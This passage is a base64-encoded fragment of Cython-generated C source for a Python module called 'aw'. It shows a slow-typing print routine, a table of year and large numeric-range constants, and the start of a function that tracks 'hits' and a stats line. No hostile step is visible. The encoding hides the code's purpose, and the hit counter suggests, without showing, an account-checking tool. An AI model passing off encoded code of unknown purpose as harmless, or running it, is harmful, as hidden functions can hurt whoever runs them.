lUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzFfZ2VuZXhwcik7CiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9wdHlwZV8yYXdfX19weXhfc2NvcGVfc3RydWN0XzJfZ2VuZXhwcik7CiAgUHlfVklTSVQodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF90eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfMl9nZW5leHByKTsKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3B0eXBlXzJhd19fX3B5eF9zY29wZV9zdHJ1Y3RfM19nZW5leHByKTsKICBQeV9WSVNJVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3R5cGVfMmF3X19fcHl4X3Njb3BlX3N0cnVjdF8zX2dlbmV4cHIpOwogIGZvciAoaW50IGk9MDsgaTwxOyArK2kpIHsgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9zbGljZVtpXSk7IH0KICBmb3IgKGludCBpPTA7IGk8MTA7ICsraSkgeyBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X3R1cGxlW2ldKTsgfQogIGZvciAoaW50IGk9MDsgaTwxMzsgKytpKSB7IF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfY29kZW9ial90YWJbaV0pOyB9CiAgZm9yIChpbnQgaT0wOyBpPDM2OTsgKytpKSB7IF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfc3RyaW5nX3RhYltpXSk7IH0KICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2Zsb2F0XzBfMDIwMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMSk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMik7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMyk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNik7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfOSk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTUpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzE2KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8zMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMzIpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzQwKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDEwKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDExKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDEyKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDEzKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE0KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE1KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE2KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE3KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE4KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDE5KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDIwKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDIxKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDIyKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yMDIzKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMjc4ODg5KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xMjc5MDAwKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8xNzc1MDAwMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTc3NTAwMDEpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzI3OTc2MDAwMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjc5NzYwMDAxKTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF85MDA5OTAwMDApOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzkwMDk5MDAwMSk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTYyOTAxMDAwMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTYyOTAxMDAwMSk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjM2OTM1OTc2MSk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjM2OTM1OTc2Mik7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNDIzOTUxNjc1NCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNDIzOTUxNjc1NSk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNjM0NTEwODIwOSk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNjM0NTEwODIxMCk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMTAwMTYyMzIzOTUpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzEwMDE2MjMyMzk2KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF8yNzIzODYwMjE1OSk7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfMjcyMzg2MDIxNjApOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzQzNDY0NDc1Mzk1KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF80MzQ2NDQ3NTM5Nik7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNTAyODkyOTc2NDcpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzUwMjg5Mjk3NjQ4KTsKICBfX1B5eF9WSVNJVF9DT05TVCh0cmF2ZXJzZV9tb2R1bGVfc3RhdGUtPl9fcHl4X2ludF81NzQ2NDcwNzA4Mik7CiAgX19QeXhfVklTSVRfQ09OU1QodHJhdmVyc2VfbW9kdWxlX3N0YXRlLT5fX3B5eF9pbnRfNTc0NjQ3MDcwODMpOwogIF9fUHl4X1ZJU0lUX0NPTlNUKHRyYXZlcnNlX21vZHVsZV9zdGF0ZS0+X19weXhfaW50XzYzMzEzNDI2OTM4KTsKICByZXR1cm4gMDsKfQojZW5kaWYKCgoKCgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJhd18xdGluZm8oUHlPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKnVudXNlZCk7IApzdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8yYXdfMXRpbmZvID0geyJ0aW5mbyIsIChQeUNGdW5jdGlvbilfX3B5eF9wd18yYXdfMXRpbmZvLCBNRVRIX05PQVJHUywgMH07CnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMmF3XzF0aW5mbyhQeU9iamVjdCAqX19weXhfc2VsZiwgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqdW51c2VkKSB7CiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJ0aW5mbyAod3JhcHBlcikiLCAwKTsKICBfX3B5eF9rd3ZhbHVlcyA9IF9fUHl4X0t3VmFsdWVzX1ZBUkFSR1MoX19weXhfYXJncywgX19weXhfbmFyZ3MpOwogIF9fcHl4X3IgPSBfX3B5eF9wZl8yYXdfdGluZm8oX19weXhfc2VsZik7CgogIAogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3BmXzJhd190aW5mbyhDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpfX3B5eF9zZWxmKSB7CiAgUHlPYmplY3QgKl9fcHl4X3ZfdGxuID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9jaGFyID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBQeV9zc2l6ZV90IF9fcHl4X3RfMjsKICBQeV9zc2l6ZV90IF9fcHl4X3RfMzsKICB2b2lkICpfX3B5eF90XzQ7CiAgaW50IF9fcHl4X3RfNTsKICBpbnQgX19weXhfdF82OwogIFB5X3NzaXplX3QgX19weXhfdF83OwogIFB5T2JqZWN0ICpfX3B5eF90XzggPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzkgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEwID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xMSA9IE5VTEw7CiAgc2l6ZV90IF9fcHl4X3RfMTI7CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgidGluZm8iLCAwKTsKCiAgCiAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfKTsKICBfX3B5eF92X3RsbiA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfOwoKICAKICBfX1B5eF9JTkNSRUYoX19weXhfdl90bG4pOwogIF9fcHl4X3RfMSA9IF9fcHl4X3ZfdGxuOwogIF9fcHl4X3RfNiA9IF9fUHl4X2luaXRfdW5pY29kZV9pdGVyYXRpb24oX19weXhfdF8xLCAoJl9fcHl4X3RfMyksICgmX19weXhfdF80KSwgKCZfX3B5eF90XzUpKTsgaWYgKHVubGlrZWx5KF9fcHl4X3RfNiA9PSAoKGludCktMSkpKSBfX1BZWF9FUlIoMCwgOTEsIF9fcHl4X0wxX2Vycm9yKQogIGZvciAoX19weXhfdF83ID0gMDsgX19weXhfdF83IDwgX19weXhfdF8zOyBfX3B5eF90XzcrKykgewogICAgX19weXhfdF8yID0gX19weXhfdF83OwogICAgX19weXhfdF84ID0gX19QeXhfUHlVbmljb2RlX0Zyb21PcmRpbmFsKF9fUHl4X1B5VW5pY29kZV9SRUFEKF9fcHl4X3RfNSwgX19weXhfdF80LCBfX3B5eF90XzIpKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgOTEsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICBfX1B5eF9YREVDUkVGX1NFVChfX3B5eF92X2NoYXIsIF9fcHl4X3RfOCk7CiAgICBfX3B5eF90XzggPSAwOwoKICAgIAogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDkyLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zdGRvdXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgOTIsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgIF9fcHl4X3RfOSA9IF9fcHl4X3RfMTE7CiAgICBfX1B5eF9JTkNSRUYoX19weXhfdF85KTsKICAgIF9fcHl4X3RfMTAgPSBQeU51bWJlcl9BZGQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV8zMG1fNDdtLCBfX3B5eF92X2NoYXIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgOTIsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApOwogICAgX19weXhfdF8xMiA9IDA7CiAgICB7CiAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzksIF9fcHl4X3RfMTB9OwogICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfd3JpdGUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTIsICgyLV9fcHl4X3RfMTIpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgOTIsIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgIH0KICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwoKICAgIAogICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzEwLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDkzLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3N0ZG91dCk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDkzLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzkpOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgIF9fcHl4X3RfMTEgPSBfX3B5eF90Xzk7CiAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMSk7CiAgICBfX3B5eF90XzEyID0gMDsKICAgIHsKICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTEsIE5VTEx9OwogICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZmx1c2gsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTIsICgxLV9fcHl4X3RfMTIpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgOTMsIF9fcHl4X0wxX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgIH0KICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwoKICAgIAogICAgX19weXhfdF85ID0gTlVMTDsKICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RpbWUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgOTQsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpOwogICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3NsZWVwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDk0LCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICBfX3B5eF90XzEyID0gMTsKICAgICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzEwKSkpIHsKICAgICAgX19weXhfdF85ID0gUHlNZXRob2RfR0VUX1NFTEYoX19weXhfdF8xMCk7CiAgICAgIGFzc2VydChfX3B5eF90XzkpOwogICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfMTApOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF85KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF8xMCwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgX19weXhfdF8xMiA9IDA7CiAgICB9CiAgICAjZW5kaWYKICAgIHsKICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZmxvYXRfMF8wMjAwfTsKICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoX19weXhfdF8xMCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMiwgKDItX19weXhfdF8xMikgfCAoX19weXhfdF8xMipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA5NCwgX19weXhfTDFfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgfQogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEpOyBfX3B5eF90XzEgPSAwOwoKICAKICBfX3B5eF90XzEwID0gTlVMTDsKICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7CiAgX19weXhfdF85ID0gX19weXhfYnVpbHRpbl9wcmludDsgCiAgX19weXhfdF8xMiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMTAsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VffTsKICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfOSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMiwgKDItX19weXhfdF8xMikgfCAoX19weXhfdF8xMipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCA5NSwgX19weXhfTDFfZXJyb3IpCiAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICB9CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CgogIAoKICAKICBfX3B5eF9yID0gUHlfTm9uZTsgX19QeXhfSU5DUkVGKFB5X05vbmUpOwogIGdvdG8gX19weXhfTDA7CiAgX19weXhfTDFfZXJyb3I6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzkpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMCk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsKICBfX1B5eF9BZGRUcmFjZWJhY2soImF3LnRpbmZvIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19weXhfTDA6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdl90bG4pOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9jaGFyKTsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18yYXdfM3BwcHAoUHlPYmplY3QgKl9fcHl4X3NlbGYsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKnVudXNlZCk7IApzdGF0aWMgUHlNZXRob2REZWYgX19weXhfbWRlZl8yYXdfM3BwcHAgPSB7InBwcHAiLCAoUHlDRnVuY3Rpb24pX19weXhfcHdfMmF3XzNwcHBwLCBNRVRIX05PQVJHUywgMH07CnN0YXRpYyBQeU9iamVjdCAqX19weXhfcHdfMmF3XzNwcHBwKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICp1bnVzZWQpIHsKICBDWVRIT05fVU5VU0VEIFB5T2JqZWN0ICpjb25zdCAqX19weXhfa3d2YWx1ZXM7CiAgUHlPYmplY3QgKl9fcHl4X3IgPSAwOwogIF9fUHl4X1JlZk5hbm55RGVjbGFyYXRpb25zCiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoInBwcHAgKHdyYXBwZXIpIiwgMCk7CiAgX19weXhfa3d2YWx1ZXMgPSBfX1B5eF9Ld1ZhbHVlc19WQVJBUkdTKF9fcHl4X2FyZ3MsIF9fcHl4X25hcmdzKTsKICBfX3B5eF9yID0gX19weXhfcGZfMmF3XzJwcHBwKF9fcHl4X3NlbGYpOwoKICAKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8yYXdfMnBwcHAoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZikgewogIFB5T2JqZWN0ICpfX3B5eF92X1NleHkgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X1NleCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfWHh4ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdl9zdGF0c19saW5lID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF81ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF82ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF83ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF84ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF85ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xMFsxNV07CiAgc2l6ZV90IF9fcHl4X3RfMTE7CiAgaW50IF9fcHl4X2xpbmVubyA9IDA7CiAgY29uc3QgY2hhciAqX19weXhfZmlsZW5hbWUgPSBOVUxMOwogIGludCBfX3B5eF9jbGluZW5vID0gMDsKICBfX1B5eF9SZWZOYW5ueVNldHVwQ29udGV4dCgicHBwcCIsIDApOwoKICAKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hpdHMpOyB